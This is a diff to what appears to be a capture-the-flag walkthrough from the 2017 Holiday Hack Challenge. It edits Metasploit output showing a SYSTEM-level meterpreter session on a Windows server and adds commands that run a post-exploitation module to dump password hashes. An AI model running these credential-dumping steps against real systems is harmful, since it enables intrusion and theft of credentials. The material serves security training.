@@ -709,15 +709,19 @@ msf exploit(handler) > sessions
 Active sessions
 ===============
 
-  Id  Name  Type                     Information                                           Connection
-  --  ----  ----                     -----------                                           ----------
-  1         meterpreter x64/windows  HHC17-SMB-SERVE\LocalSystem @ HHC17-SMB-SERVE  1.2.3.4:4445 -> 35.185.57.190:49756 (10.142.0.8)
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ HHC17-SMB-SERVE  1.2.3.4:4445 -> 35.185.57.190:49756 (10.142.0.8)
 #+END_SRC
 
-And now, we've managed to elevate our credentials. Let's dump the hashes on the system:
+And now, we've managed to elevate our credentials. There are a few
+"post-exploitation" modules for Meterpreter, which will use our
+session. For instance, let's dump the hashes on the system:
 
 #+BEGIN_SRC 
-msf exploit(multi) > use post/windows/gather/credentials/credential_collector
+msf exploit(handler) > set -g SESSION 1
+SESSION => 1
+msf exploit(handler) > use post/windows/gather/credentials/credential_collector
 msf post(credential_collector) > run
 
 [*] Running module against HHC17-SMB-SERVE
